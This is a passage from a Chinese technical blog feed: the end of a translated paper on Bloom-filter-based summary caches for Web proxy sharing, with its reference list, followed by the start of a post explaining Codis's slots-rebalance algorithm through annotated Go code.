优点是，除了远程命中之外，同级代理之间几乎不需要通信。</p><p>关于Web缓存层次结构和缓存共享的研究也很多。 分层Web缓存最早是在Harvest项目[26,12]中提出的，该项目还引入了ICP协议。 当前，Squid代理服务器实现了ICP协议的第2版[48]，我们的摘要缓存增强型ICP以此版本为基础。 自适应Web缓存[50]提出了一种基于多播的自适应缓存基础结构，用于在Web中分发文档。 特别地，该方案试图沿着到服务器的路线将文档放置在正确的缓存中。 我们的研究未解决定位问题。 相反，我们注意到我们的研究是互补的，因为摘要缓存方法可以用作传达缓存内容的机制。</p><p>尽管我们没有模拟这种情况，但是可以在父代理和子代理之间使用摘要缓存增强的ICP。 分层Web缓存不仅包括相邻（同级）代理之间的协作，还包括父代和子代代理之间的协作。 同级代理与父级代理之间的区别在于，代理不能要求同级代理从服务器获取文档，而可以要求父级代理这样做。 尽管我们的模拟仅涉及同级代理之间的协作，但是摘要缓存方法可用于将有关父缓存内容的信息传播到子代理，并消除子代理对父代的ICP查询。 我们对Questnet跟踪的检查表明，子级到父级ICP查询可能是父级必须处理的消息的很大一部分（超过2&#x2F;3）。</p><p>在操作系统的上下文中，已经有很多关于协作文件缓存[11,2]和全局存储系统（GMS）[17]的研究。这些系统中的基本假设是高速局域网比磁盘快，并且工作站应使用彼此的空闲内存来缓存文件页面或虚拟内存页面，以避免流向磁盘。在这方面，问题与Web缓存共享完全不同。另一方面，在这两种情况下，都存在缓存应紧密协作的问题。大多数协作文件缓存和GMS系统都试图模拟全局LRU替换算法，有时还会使用提示[45]。有趣的是，对于是否需要全局替换算法，我们得出了截然不同的结论[17]。原因是在OS上下文中，全局替换算法用于从空闲工作站窃取内存（即负载均衡缓存），而在Web缓存共享中，每个代理一直都在忙。因此，尽管简单的缓存共享在OS上下文中的性能较差，但只要每个代理的资源配置都适合其负载，就足以满足Web代理缓存共享的需要。最后，请注意，基于Bloom筛选器的摘要缓存技术不限于Web代理缓存上下文，而是可以在其他缓存内容的知识有帮助的情况下使用，例如，在集群中的缓存和负载平衡方面。服务器。</p><h2 id="结论与未来工作"><a href="#结论与未来工作" class="headerlink" title="结论与未来工作"></a>结论与未来工作</h2><p>我们提出了摘要缓存增强的ICP，这是一种可扩展的广域Web缓存共享协议。 使用跟踪驱动的模拟和测量，我们演示了Web代理缓存共享的好处，说明了当前缓存共享协议的开销，并表明摘要缓存方法大大降低了开销。 我们研究了这种方法的两个关键方面：延迟更新的影响以及摘要的简洁表示。 我们的解决方案是基于具有更新延迟阈值的Bloom过滤器的摘要，对内存和带宽的需求较低，但实现了与原始ICP协议相似的命中率。 尤其是，跟踪驱动的仿真表明，与ICP相比，新协议将代理间协议消息的数量减少了25到60，将带宽消耗减少了50％以上，同时几乎不降低代理质量。 缓存命中率。 仿真和分析进一步证明了该协议的可扩展性。</p><p>我们已经在<code>Squid 1.1.14</code>中构建了一个原型实现。 合成和跟踪重播实验表明，除了减少网络流量外，新协议还将CPU开销减少了75％至95％之间，并改善了客户端延迟。 原型实现是公开可用的[15]。</p><p>未来的工作还有很多。 我们计划调查该协议对父子代理合作以及给定工作负载的最佳层次结构配置的影响。 我们还计划研究摘要缓存在各种Web缓存一致性协议中的应用。 最后，摘要缓存可用于单个代理实现中以加快缓存查找的速度，我们将通过修改代理实现来量化效果。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[1] J. Almeida and P. Cao. (1997) Wisconsin proxy benchmark 1.0. [Online]. Available: <a href="http://www.cs.wisc.edu/~cao/wpbl.0.html">http://www.cs.wisc.edu/~cao/wpbl.0.html</a><br>[2] T.E. Anderson, M. D. Dahlin, J. M. Neefe, D. A. Patterson, D. S. Roselli,and R. Y. Wang,”Serverless network file systems,” in Proc. 15th ACM Syrup. Operating Syst. Principles,Dec. 1995.<br>[3] M. Arlitt, R. Friedrich, and T. Jin, “Performance evaluation of Web proxy cache replacement policies,” in Proc. Performance Tools’98, Lecture Notes in Computer Science, 1998, vol. 1469, pp. 193-206.<br>[4] M. Arlitt and C. Williamson, “Web server workload characterization,” in Proc. 1996 ACM SIGMETRICS Int. Conf. Measurement and Modeling of Computer Systems, May 1996.<br>[5] A. Baggio and G. Pierre. Oleron: Supporting information sharing in large-scale mobile environments, presented at ERSADS Workshop, Mar.[Online]. Available: <a href="http://www-sor.inria.fr/projects/relais/">http://www-sor.inria.fr/projects/relais/</a><br>[6] K. Beck. Tennessee cache box project, presented at 2nd Web Caching Workshop, Boulder, CO, June 1997. [Online]. Available: <a href="http://ircache.nlanr.net/Cache/Workshop97/">http://ircache.nlanr.net/Cache/Workshop97/</a><br>[7] B. Bloom, “Space&#x2F;time trade-offs in hash coding with allowable errors,” Commun. ACM, vol. 13, no. 7, pp. 422-426, July 1970.<br>[8] L. Breslau, P. Cao, L. Fan, G. Phillips, and S. Shenker, “Web caching and zipf-like distributions: Evidence and implications,” in Proc. IEEE INFOCOM, 1999.<br>[9] A. Z. Broder, “Some applications of Rabin’s fingerprinting method,” in Sequences 11: Methods in Communications, Security, and Computer Science, R. Capocelli, A. De Santis, and U. Vaccaro, Eds. New York, NY: Springer-Verlag, 1993, pp. 143-152.<br>[10] P. Can and S. Irani, “Cost-aware WWW proxy caching algorithms,” in Proc. 1997 USEN1X Symp. lnternet Technology and Systems, Dec. 1997, <a href="http://www.cs.wisc.edu/~cao/papers/gd-size.html">http://www.cs.wisc.edu/~cao/papers/gd-size.html</a>, pp. 193-206.<br>[11] M. Crovella and A. Bestavros, “Self-similiarity in world wide web traffic: Evidence and possible causes,” in Proc. 1996 Sigmetrics Conf. Measurement and Modeling of Computer Systems, Philadelphia, PA, May 1996.<br>[12] C. R. Cunha, A. Bestavros, and M. E. Crovella, “Characteristics of WWW client-based traces,” Boston University, Boston, MA, Tech. Rep. BU-CS-96-010, Oct. 1995.<br>[13] M. D. Dahlin, R. Y. Wang, T. E. Anderson, and D. A. Patterson, “Cooperative caching: Using remote client memory to improve file system performance,” in Proc. 1st USENIX Symp. Operating Systems Design and Implementation, Nov. 1994, pp. 267-280.<br>[14] P. B. Danzig, R. S. Hall, and M. E Schwartz, “A case for caching file objects inside internetworks,” in Proc. S1GCOMM, 1993, pp. 239-248.<br>[15] E Douglis, A. Feldmann, B. Krishnamurthy, and J. Mogul, “Rate of change and other metrics: A live study of the world wide web,” in Proc. USENIX Symp. lnternet Technology and Systems, Dec. 1997.<br>[16] B.M. Duska, D. Marwood, and M. J. Feeley, “The measured access characteristics of world-wide-web client proxy caches,” in Proc. USENIX Symp. lnternet Technology and Systems, Dec. 1997.<br>[17] L. Fan, P. Cao, and J. Almeida. (1998, Feb.) A prototype implementation of summary-cache enhanced icp in Squid 1.1.14. [Online]. Available: <a href="http://www.cs.wisc.edu/~cao/sc-icp.html">http://www.cs.wisc.edu/~cao/sc-icp.html</a><br>[18] L. Fan, P. Cao, J. Almeida, and A. Z. Broder, “Summary cache: A scalable wide-area web cache sharing protocol,” in Proc. ACM SIGCOMM,<br>[19] –, (1998, Feb.) Summary cache: A scalable wide-area web cache sharing protocol. Tech. Rep. 1361, Computer Science Department, University of Wisconsin-Madison. [Online]. Available: <a href="http://www.cs.wisc.edu/-cao/papers/summarycache.html">http://www.cs.wisc.edu/-cao/papers/summarycache.html</a><br>[20] M.J. Feeley, W. E. Morgan, E H. Pighin, A. R. Karlin, H. M. Levy, and C. A. Thekkath, “Implementing global memory management in a workstation cluster,” in Proc. 15th ACM Symp. Operating Systems Principles, Dec. 1995.<br>[21] ICP working group. (1998). National Lab for Applied Network Research. [Online]. Available: <a href="http://ircache.nlanr.neticache/ICP/">http://ircache.nlanr.netICache/ICP/</a><br>[22] A. Fox, S. D. Gribhle, Y. Chawathe, E. A. Brewer, and P. Gauthier<br>[23] S. Gadde, M. Rabinovich, and J. Chase. Reduce, reuse, recycle: An approach to building large internet caches, presented at 6th Workshop Hot Topics in Operating Systems (HotOS VI), May 1997. [Online]. Available: <a href="http://www.research.att.com/-misha/">http://www.research.att.com/-misha/</a><br>[24] G. Gonnet and R. Baeza-Yates, Handbook of Algorithms and Data Structures. Reading, MA: Addison-Wesley, 1991.<br>[25] S. Gribble and E. Brewer, “System design issues for intemet middleware service: Deduction from a large client trace,” in Proc. USENIX Symp.Internet Technology and Systems, Dec. 1997.<br>[26] –, (1997, June) UCB home IP HTTP traces. [Online]. Available:<a href="http://www.cs.berkeley.edu/~gribble/traces/index.html">http://www.cs.berkeley.edu/~gribble/traces/index.html</a><br>[27] C. Grimm. The dfn cache service in B-WiN. presented at 2nd Web Caching Workshop, Boulder, CO, June 1997. [Online]. Available: <a href="http://www-cache.dfn.de/CacheEN/">http://www-cache.dfn.de/CacheEN/</a><br>[28] The Harvest Group. (1994) Harvest Information Discovery and Access System. [Online]. Available: <a href="http://excalibur.usc.edu/">http://excalibur.usc.edu/</a><br>[29] The Relais Group. (1998) Relais: Cooperative caches for the world-wide web. [Online]. Available: <a href="http://www-sor.inria.fr/projects/relais/">http://www-sor.inria.fr/projects/relais/</a><br>[30] J. Gwertzman and M. Seltzer, “World-wide web cache consistency,” in Proc. 1996 USENIX Tech. Conf., San Diego, CA, Jan. 1996.<br>[31] IRCACHE. (1999, Mar.) Benchmarking Proxy Caches with Web Polygraph. [Online].Available: <a href="http://www.polygraph.ircache.net/slides/">http://www.polygraph.ircache.net/slides/</a><br>[32] V. Jacobson. How to kill the internet, presented at SIGCOMM’95 Middleware Workshop, Aug. 1995. [Online]. Available: <a href="ftp://ftp.ee.lhl/">ftp://ftp.ee.lhl</a> .gov&#x2F;talks&#x2F;vj -webflame.ps.Z<br>[33] J. Jung. Nation-wide caching project in korea, presented at 2nd Web Caching Workshop, Boulder, CO, June 1997. [Online]. Available: <a href="http://ircache.nlanr.net/Cache/Workshop97/">http://ircache.nlanr.net/Cache/Workshop97/</a><br>[34] B. Krishnamurthy and C. E. Ellis, “Study of piggyback cache validation for proxy caches in the world wide web,” in Proc. USENIX Symp. lnternet Technology and Systems, Dec. 1997.<br>[35] T. M. Kroeger, J. Mogul, and C. Maltzahn. (1996, Aug.) Digital’s web proxy traces. [Online]. Available: <a href="ftp://ftp.digital.com/pub/DEC/traces/proxy/webtraces.html">ftp://ftp.digital.com/pub/DEC/traces/proxy/webtraces.html</a><br>[36] T.M. Kroeger, D. D. E. Long, and J. C. Mogul, “Exploring the bounds of web latency reduction from caching and prefetching,” in Proc. USEN1X Syrup. lnternet Technology and Systems, Dec. 1997.<br>[37] C. Liu and P. Cao, “Maintaining strong cache consistency for the world-wide web,” presented at the 17th Int. Conf. Distributed Computing Systems, May 1997.<br>[38] P. Lorenzetti, L. Rizzo, and L. Vicisano. (1996, Oct.) Replacement policies for a proxy cache. Universita di Pisa, Italy. [Online]. Available: <a href="http://www.iet.unipi.it/~luigi/caching.ps.gz">http://www.iet.unipi.it/~luigi/caching.ps.gz</a><br>[39] C. Maltzahn, K. Richardson, and D. Grunwald, “Performance issues of enterprise level web proxies,” in Proc. 1997 ACM SIGMETRICS Int. Conf. Measurement and MOdeling of Computer Systems, June 1997, pp. 13-23.<br>[40] J. Marais and K. Bharat. Supporting cooperative and personal surfing with a desktop assistant, presented at ACM UIST’97. [Online]. Available: <a href="ftp://ftp.digital.com/pub/DEC/SRC/publications/marais/uist97paper.pdf">ftp://ftp.digital.com/pub/DEC/SRC/publications/marais/uist97paper.pdf</a>.<br>[41] A. J. Menezes, P. C. van Oorschot, and S. A. Vanstone, Handbook of Applied Cryptography: CRC Press, 1997.<br>[42] J. C. Mogul, E Douglis, A. Feldmann, and B. Krishnamurthy. Potential benefits of delta encoding and data compression for http.presented at ACM SIGCOMM’97. [Online]. Available: <a href="http://www.research.att.com/~douglis/">http://www.research.att.com/~douglis/</a><br>[43] National Lab of Applied Network Research. (1997, July) Sanitized Access Log.[Online].Available: <a href="ftp://ircache.nlanr.netltraces/">ftp://ircache.nlanr.netlTraces/</a><br>[44] J. Pietsch. Caching in the Washington State k-20 network, presented at2nd Web Caching Workshop, Boulder, CO, June 1997. [Online]. Available: http:&#x2F;lircache.nlanr.net&#x2F;CachelWorkshop97&#x2F;<br>[45] M. O. Rabin, “Fingerprinting by random polynomials,” Center for Research in Computing Technology, Harvard Univ., Tech. Rep. TR-15-81,1981.<br>[46] A. Rousskov. (1998, Apr.) Cache digest. [Online]. Available: <a href="http://squid.nlanr.net/Squid/CacheDigest/">http://squid.nlanr.net/Squid/CacheDigest/</a><br>[47] P. Sarkar and J. Hartman, “Efficient cooperative caching using hints,”in Proc. USENIX Conf. Operating System Design and Implementations,Oct. 1996.<br>[48] V. Valloppillil and K. W. Ross. (1997) Cache array routing protocol vl.0. [Online]. Available: http:l&#x2F;ircache.nlanr.net&#x2F;CachelICP&#x2F;draftvinod-carp-v 1-02.tx<br>[49] D. Wessels and K. Claffy. (1998) Internet cache protocol (ICP) v.2. [Online]. Available: <a href="http://ds.internic.net/rfc/rfc2186.txt">http://ds.internic.net/rfc/rfc2186.txt</a><br>[50] S. Williams, M. Abrams, C. R. Stanbridge, G. Abdulla, and E. A. Fox. Removal policies in network caches for world-wide web documents, presented at ACM SIGCOMM’96. [Online]. Available: <a href="http://ei.cs.vt.edu/~succeed/96sigcomm/">http://ei.cs.vt.edu/~succeed/96sigcomm/</a><br>[51] L. Zhang, S. Floyd, and V. Jacobson. Adaptive web caching, presented at<br>2nd Web Caching Workshop, Boulder, CO, June 1997. [Online]. Available: <a href="http://ircache.nlanr.net/Cache/Workshop97/Papers/Floyd/floyd">http://ircache.nlanr.net/Cache/Workshop97/Papers/Floyd/floyd</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
            <tag> BloomFilter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codis的Slots-Rebalance算法</title>
      <link href="/2020/05/21/codis-slots-rebalance/"/>
      <url>/2020/05/21/codis-slots-rebalance/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h2><p><code>Codis</code>中所有的key都被hash到<code>1024</code>个slots上，在每个slots分配均匀的前提下，如果一个分片中的slots过多，该分片中存储的key的数量也就越多，该分片对应的负载也就越大，在扩缩容之后为了保证集群中各分片的负载均衡，需要调整分片的slots的数量。</p><h3 id="1-1、使用场景"><a href="#1-1、使用场景" class="headerlink" title="1.1、使用场景"></a>1.1、使用场景</h3><p><code>Codis</code>的集群初始为<code>2个分片</code>，当业务增长需要扩容到<code>4个分片</code>的时候，我们可以手动指定slots指挥<code>Codis</code>进行数据迁移，也可以使用<code>AutoRebalance</code>让<code>Codis</code>自动的进行Slots数据迁移。</p><h3 id="1-2、迁移原则"><a href="#1-2、迁移原则" class="headerlink" title="1.2、迁移原则"></a>1.2、迁移原则</h3><ul><li><p>尽可能的均匀分配Slots；</p></li><li><p>尽量减少迁移的Slots的数量；</p></li></ul><h2 id="二、Rebalance算法"><a href="#二、Rebalance算法" class="headerlink" title="二、Rebalance算法"></a>二、Rebalance算法</h2><h3 id="2-1、Slots分配方案"><a href="#2-1、Slots分配方案" class="headerlink" title="2.1、Slots分配方案"></a>2.1、Slots分配方案</h3><ul><li><p>统计当前迁移中<code>Slots</code>的结果，用于当前迁移方案的基础数据；</p></li><li><p>按照每个<code>Group</code>可分配Slots的最大限制，统计Group中需要迁入&#x2F;出的<code>Slots</code>信息；</p></li><li><p>依据现有的<code>Group</code>中<code>Slots</code>的数量构建红黑树，统计分配<code>Slots</code>；</p></li><li><p>审核并存储迁移方案；</p></li></ul><h3 id="2-2、代码实现"><a href="#2-2、代码实现" class="headerlink" title="2.2、代码实现"></a>2.2、代码实现</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Topom)</span></span> SlotsRebalance(confirm <span class="type">bool</span>) (<span class="keyword">map</span>[<span class="type">int</span>]<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    s.mu.Lock()</span><br><span class="line">    <span class="keyword">defer</span> s.mu.Unlock()</span><br><span class="line">    ctx, err := s.newContext()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取所有group的id,每一个group必须拥有redis实例，</span></span><br><span class="line"><span class="comment">     * 依据id从小到大排序group，其中group的id最小值为1</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">var</span> groupIds []<span class="type">int</span></span><br><span class="line">    <span class="keyword">for</span> _, g := <span class="keyword">range</span> ctx.group &#123;</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(g.Servers) != <span class="number">0</span> &#123;</span><br><span class="line">            groupIds = <span class="built_in">append</span>(groupIds, g.Id)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sort.Ints(groupIds)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(groupIds) == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, errors.Errorf(<span class="string">&quot;no valid group could be found&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 每一个分片(组)都拥有3个属性:</span></span><br><span class="line"><span class="comment">     *     assigned: 需要给当前的group分配的slots的数量</span></span><br><span class="line"><span class="comment">     *     pendings: 当前group需要移出的slots信息，其中key为group的id，value为slots的数组</span></span><br><span class="line"><span class="comment">     *     moveout:  当前group需要移出/入(为负数时代表移入)的slots数量，其中key为group的id，value为slots的数量</span></span><br><span class="line"><span class="comment">     * docking为需要最终操作的slots的列表</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">var</span> (</span><br><span class="line">        assigned = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">int</span>]<span class="type">int</span>)</span><br><span class="line">        pendings = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">int</span>][]<span class="type">int</span>)</span><br><span class="line">        moveout  = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">int</span>]<span class="type">int</span>)</span><br><span class="line">        docking  []<span class="type">int</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取group的当前的slots的数量 */</span></span><br><span class="line">    <span class="keyword">var</span> groupSize = <span class="function"><span class="keyword">func</span><span class="params">(gid <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> assigned[gid] + <span class="built_in">len</span>(pendings[gid]) - moveout[gid]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 遍历slots，获取正在迁移中的slots的迁移结果并该结果计入本次的迁移统计 */</span></span><br><span class="line">    <span class="keyword">for</span> _, m := <span class="keyword">range</span> ctx.slots &#123;</span><br><span class="line">        <span class="keyword">if</span> m.Action.State != models.ActionNothing &#123;</span><br><span class="line">            assigned[m.Action.TargetId]++</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 按照平均值计算每个group可以分到的slots的数量(总量为1024) */</span></span><br><span class="line">    <span class="keyword">var</span> lowerBound = MaxSlotNum / <span class="built_in">len</span>(groupIds)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 遍历slots，统计需要迁移的slots信息 */</span></span><br><span class="line">    <span class="keyword">for</span> _, m := <span class="keyword">range</span> ctx.slots &#123;</span><br><span class="line">        <span class="comment">/* 对于处于迁移状态中的slots不执行任何操作 */</span></span><br><span class="line">        <span class="keyword">if</span> m.Action.State != models.ActionNothing &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* 当前的slots属于集群中的一个group */</span></span><br><span class="line">        <span class="keyword">if</span> m.GroupId != <span class="number">0</span> &#123;</span><br><span class="line">            <span class="comment">/* slot所归属group中的slots的数量小于group的平均值，则需要往这个group中分配新的slot */</span></span><br><span class="line">            <span class="keyword">if</span> groupSize(m.GroupId) &lt; lowerBound &#123;</span><br><span class="line">                assigned[m.GroupId]++</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/* slot所归属group中的slots的数量大于group的平均值，则需要将这个slot移出它所归属的group */</span></span><br><span class="line">                pendings[m.GroupId] = <span class="built_in">append</span>(pendings[m.GroupId], m.Id)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 创建一个自定义比较器的红黑树，这棵树代表着需要进行slots迁移的所有group</span></span><br><span class="line"><span class="comment">     * key是group的id，slots最少的在左面，slots最多的在右面，key是group的id</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">var</span> tree = rbtree.NewWith(<span class="function"><span class="keyword">func</span><span class="params">(x, y <span class="keyword">interface</span>&#123;&#125;)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> gid1 = x.(<span class="type">int</span>)</span><br><span class="line">        <span class="keyword">var</span> gid2 = y.(<span class="type">int</span>)</span><br><span class="line">        <span class="keyword">if</span> gid1 != gid2 &#123;</span><br><span class="line">            <span class="keyword">if</span> d := groupSize(gid1) - groupSize(gid2); d != <span class="number">0</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> d</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> gid1 - gid2</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">for</span> _, gid := <span class="keyword">range</span> groupIds &#123;</span><br><span class="line">        tree.Put(gid, <span class="literal">nil</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 遍历所有的slots */</span></span><br><span class="line">    <span class="keyword">for</span> _, m := <span class="keyword">range</span> ctx.slots &#123;</span><br><span class="line">        <span class="comment">/* 对于处于迁移状态中的slots不执行任何操作 */</span></span><br><span class="line">        <span class="keyword">if</span> m.Action.State != models.ActionNothing &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> m.GroupId != <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 有一些slots不属于任何group，需要将这些slots分配给slots最少的group，也就是红黑树左面的最小的group */</span></span><br><span class="line">        dest := tree.Left().Key.(<span class="type">int</span>)</span><br><span class="line">        tree.Remove(dest)</span><br><span class="line"></span><br><span class="line">        docking = <span class="built_in">append</span>(docking, m.Id)</span><br><span class="line">        moveout[dest]--</span><br><span class="line"></span><br><span class="line">        tree.Put(dest, <span class="literal">nil</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 每一个group能够获取slots的数量的上限，其实约等于 lowerBound + 1 */</span></span><br><span class="line">    <span class="keyword">var</span> upperBound = (MaxSlotNum + <span class="built_in">len</span>(groupIds) - <span class="number">1</span>) / <span class="built_in">len</span>(groupIds)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 树中需要迁移的group大于等于2则需要进行rebalance，只有一个group就不需要了 */</span></span><br><span class="line">    <span class="keyword">for</span> tree.Size() &gt;= <span class="number">2</span> &#123;</span><br><span class="line">        from := tree.Right().Key.(<span class="type">int</span>)</span><br><span class="line">        tree.Remove(from)</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 当前group已经把所有需要移出的slots迁移出完毕 */</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(pendings[from]) == moveout[from] &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        dest := tree.Left().Key.(<span class="type">int</span>)</span><br><span class="line">        tree.Remove(dest)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> (</span><br><span class="line">            fromSize = groupSize(from)</span><br><span class="line">            destSize = groupSize(dest)</span><br><span class="line">        )</span><br><span class="line">        <span class="comment">/* 右面的group中slots的数量小于等于每个group的平均值,则表示该group迁移完成，不需要再次加入tree中 */</span></span><br><span class="line">        <span class="keyword">if</span> fromSize &lt;= lowerBound &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* 左面的group中slots的数量大于等于每个group的最大值,则表示该group也迁移完成，不需要再次加入tree中 */</span></span><br><span class="line">        <span class="keyword">if</span> destSize &gt;= upperBound &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* 左右group中的slots的数量相差小于等于1，则表示这个两个group也不需要再次加入tree中了 */</span></span><br><span class="line">        <span class="keyword">if</span> d := fromSize - destSize; d &lt;= <span class="number">1</span> &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 右面的group移出了一个，左面的group加入了一个 */</span></span><br><span class="line">        moveout[from]++</span><br><span class="line">        moveout[dest]--</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 还需要继续迁移，将这两个group继续加入树中 */</span></span><br><span class="line">        tree.Put(from, <span class="literal">nil</span>)</span><br><span class="line">        tree.Put(dest, <span class="literal">nil</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> gid, n := <span class="keyword">range</span> moveout &#123;</span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 当前group需要移出n个slots */</span></span><br><span class="line">        <span class="keyword">if</span> n &gt; <span class="number">0</span> &#123;</span><br><span class="line">            <span class="comment">/* 倒序遍历需要移出的slots的列表，将需要迁移的slots加入到docking中 */</span></span><br><span class="line">            sids := pendings[gid]</span><br><span class="line">            sort.Sort(sort.Reverse(sort.IntSlice(sids)))</span><br><span class="line"></span><br><span class="line">            docking = <span class="built_in">append</span>(docking, sids[<span class="number">0</span>:n]...)</span><br><span class="line">            pendings[gid] = sids[n:]</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">delete</span>(moveout, gid)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 排序需要操作的slots列表 */</span></span><br><span class="line">    sort.Ints(docking)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> plans = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">int</span>]<span class="type">int</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 遍历group，获取每一个group需要迁入多少个slots并将docking中的slots分配给对应的group，</span></span><br><span class="line"><span class="comment">     * plans就是最终的分配方案，将某一个slot分配给某一个group</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> _, gid := <span class="keyword">range</span> groupIds &#123;</span><br><span class="line">        <span class="keyword">var</span> in = -moveout[gid]</span><br><span class="line">        <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; in &amp;&amp; <span class="built_in">len</span>(docking) != <span class="number">0</span>; i++ &#123;</span><br><span class="line">            plans[docking[<span class="number">0</span>]] = gid</span><br><span class="line">            docking = docking[<span class="number">1</span>:]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 审批该方案 */</span></span><br><span class="line">    <span class="keyword">if</span> !confirm &#123;</span><br><span class="line">        <span class="keyword">return</span> plans, <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 存储slots与group的分配方案后续执行 */</span></span><br><span class="line">    <span class="keyword">var</span> slotIds []<span class="type">int</span></span><br><span class="line">    <span class="keyword">for</span> sid, _ := <span class="keyword">range</span> plans &#123;</span><br><span class="line">        slotIds = <span class="built_in">append</span>(slotIds, sid)</span><br><span class="line">    &#125;</span><br><span class="line">    sort.Ints(slotIds)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, sid := <span class="keyword">range</span> slotIds &#123;</span><br><span class="line">        m, err := ctx.getSlotMapping(sid)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">defer</span> s.dirtySlotsCache(m.Id)</span><br><span class="line"></span><br><span class="line">        m.Action.State = models.ActionPending</span><br><span class="line">        m.Action.Index = ctx.maxSlotActionIndex() + <span class="number">1</span></span><br><span class="line">        m.Action.TargetId = plans[sid]</span><br><span class="line">        <span class="keyword">if</span> err := s.storeUpdateSlotMapping(m); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> plans, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3、本地测试代码"><a href="#2-3、本地测试代码" class="headerlink" title="2.3、本地测试代码"></a>2.3、本地测试代码</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;sort&quot;</span></span><br><span class="line"></span><br><span class="line">    rbtree <span 